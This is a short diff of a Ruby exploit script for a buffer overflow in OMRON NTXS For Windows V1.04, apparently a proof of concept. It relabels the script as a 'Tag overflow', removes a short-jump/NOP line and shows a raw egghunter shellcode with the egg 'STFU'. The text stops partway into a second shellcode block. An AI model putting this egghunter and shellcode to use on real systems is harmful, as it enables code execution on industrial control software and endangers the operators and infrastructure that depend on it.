@@ -1,13 +1,11 @@
 #!/usr/bin/env ruby
-# OMRON NTXS For Windows V1.04
+# OMRON NTXS For Windows V1.04 Tag overflow
 #
 require 'rex'
 
 egg = "STFU"
 egghunter =  "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a"
 egghunter << "\x74\xef\xb8" + egg + "\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
-
-wtf = [0x909006eb].pack('V').to_s.force_encoding("UTF-8")
 
 shellcode = egg + egg +
 "\x33\xc0" +                         
